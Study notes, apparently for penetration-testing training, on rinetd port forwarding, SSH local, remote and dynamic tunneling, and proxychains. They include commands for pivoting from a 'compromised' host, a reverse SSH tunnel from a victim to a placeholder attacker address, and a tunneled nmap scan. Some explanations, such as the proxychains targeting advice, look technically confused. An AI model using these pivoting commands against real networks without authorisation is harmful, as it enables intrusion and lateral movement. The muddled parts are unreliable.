Forwarding and Tunneling

Port Forwarding 
Port Forwarding occurs when traffic for an IP:PORT combination
end up being redirected to a different IP:PORT combination. This 
can be necessary when you want to access devices connected to a 
LAN but not to the internet. 

We can do this using the rinetd tool, which can be installed
using pacman -S rinetd the /etc/rinetd.conf file is where you 
place forwarding rules. The rule format is:

bindaddress bindport connectaddress connectport

Example: Redirect any traffic received on port 80 to 
a different IP address on port 80:

0.0.0.0 80 <TARG IP> 80

is how you would write the rule. If you write this rule and 
run sudo service rinetd restart you will see a listener on
the device running on 80. Confirm this with ss -antp | grep 80

Now, any machine that connects to port 80 on the listening 
machine will be able to access the TARGET IP in the
forwarding rule. This will give internet access to the 
blocked machine.

SSH Forwarding
Encrypted, Bi-Directional, Simple As

LOCAL FORWARDING
Use SSH to tunnel a local port to a remote server.
This is useful for pivoting between subnets, like 
when you compromise a client with 2 network interfaces
and you can only access 1 from your attacker machine. 

On your victim machine, run this:
ssh -N -L [bindaddress:]port:host:hostport [username@address]

-N prevents remote command execution,
and -L creates the local port forward.
Let's see an example: You compromised a machine behind a firewall
that can see two subnets. These are 10.11.0.x and 192.168.1.x 
To reach a machine in the second subnet, we need to pivot through
the double interface machine. SSH is enabled on the dual machine, 
so we can port forward through it and enumerate the 192.168.1.x subnet.
To do this, we run the following command on our attacking machine:

sudo ssh -N -L 0.0.0.0:<aPORT>:192.168.1.x:<bPORT> user@10.11.0.x

Here, any incoming connection on the attacker at aPORT will be forwarded
to bPORT on the 192.168.1.x address through the middle connection at
10.11.0.x

If we chose to forward 445, for example, we could then query 
smbclient pointed at localhost and it would actually send 
queries to the machine at 192.168.1.x:445 This would allow
us to enumerate samba two subnets away like it were on our own machine. 

REMOTE FORWARDING
Remote forwarding is the reverse of local forwarding, where the ports
are selected on the remote machine and then sent back to the local one.

Imagine you have user access to a Linux client on an internal network.
There is a MySQL server on 3306, but the firewall is blocking inbound
22. If outbound 22 is allowed, you can still do a remote forward. 
On the victim machine, run the following command:
ssh -N -R <attackerIP>:<atkPORT>:127.0.0.1:<remPORT> attacker@attackaddress

The attacker can then attack a localhost port and receive information
from the remote host as if it were their own local service.

DYNAMIC FORWARDING
This is when the local listner tunnels traffic to any remote destination
using a proxy. using ssh -D will create a local dynamic SOCKS4 layer 7
proxy tunneled with ssh. 

ssh -N -D <bindaddress>:PORT user@server
Example: ssh -N -D 127.0.0.1:8080 student@remote.IP

To make use of this proxy we have to edit our /etc/proxychains.conf
and add:
socks4 127.0.0.1 8080

now to run commands, you append proxychains to the front of the 
command and you can run it through the tunnel.

IF YOU ARE RUNNING PROXYCHAINS TO TARGET INTERNAL (Internet Protected)
services, you have to run your commands targeting 127.0.0.1 because
the commmand is coming out and being interpreted by the proxied machine.
Therefore, if you have these devices:

192.168.119.146 (attacker, forwarding)
192.168.146.52  (victim, receiving forward)

And you want to scan .146.52 for services, if you pass:

proxychains nmap -p- 192.168.146.52

then .146.52 will reach out to the router, resolve its own address
and scan itself. Instead, you have to pass:

proxychains nmap -p- 127.0.0.1

Which doesn't make any sense initially, but you are feeding commands
to the device which are then interpreted over there. Port forwarding
alters your perspective of the network because you take over another
body.
